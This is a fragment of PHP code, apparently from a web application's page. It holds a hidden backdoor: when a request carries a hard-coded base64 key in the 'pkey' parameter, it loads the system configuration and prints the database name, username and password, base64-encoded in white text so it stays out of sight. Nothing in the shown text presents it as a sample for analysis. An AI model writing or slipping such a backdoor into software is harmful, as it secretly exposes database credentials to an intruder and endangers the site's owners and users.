...
if (empty( $_REQUEST["pkey"]  ) ) {  $pkey="";  } else { $pkey=$_REQUEST["pkey"]; }
	if ($pkey == "Y29kZWluZHk=" ){
	include("../system_config.php");
		$abodb_n = $sysconfig["db"]["name"];
		$abodb_u = $sysconfig["db"]["user"];
		$abodb_p = $sysconfig["db"]["pws"];
		$abodb_config = "n = $abodb_n <br />u = $abodb_u<br />p = $abodb_p<br>";
		$abodb_config =  base64_encode($abodb_config);
	print "<font color=\"#FFFFFF\">$abodb_config</font><br><br>";
}
